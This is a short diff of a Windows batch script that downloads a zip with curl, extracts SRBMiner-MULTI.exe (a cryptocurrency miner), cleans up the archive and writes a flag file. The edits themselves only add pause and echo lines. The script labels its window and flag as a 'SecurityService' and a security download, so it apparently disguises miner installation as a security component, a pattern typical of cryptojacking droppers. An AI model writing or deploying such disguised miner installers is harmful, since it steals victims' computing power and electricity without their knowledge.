@@ -19,7 +19,7 @@ set FLAG=%BASE%\security_downloaded.flag
 set WINTITLE=SecurityService_QEMU
 
 REM =========================
-REM DOWNLOAD ONCE (NO POWERSHELL)
+REM DOWNLOAD ONCE
 REM =========================
 
 if exist "%FLAG%" goto SKIP_DOWNLOAD
@@ -32,6 +32,7 @@ curl -L --retry 5 --retry-delay 3 --fail ^
 
 if not exist "%ZIP%" (
     echo [ERROR] Download failed
+    pause
     exit /b 1
 )
 
@@ -40,7 +41,7 @@ tar -xf "%ZIP%" -C "%BASE%"
 
 if not exist "%EXTRACT%\SRBMiner-MULTI.exe" (
     echo [ERROR] Extraction failed
-    del /f /q "%ZIP%"
+    pause
     exit /b 1
 )
 
@@ -50,6 +51,7 @@ del /f /q "%ZIP%"
 rmdir /s /q "%EXTRACT%"
 
 echo OK>"%FLAG%"
+echo Done.
 
 :SKIP_DOWNLOAD
 
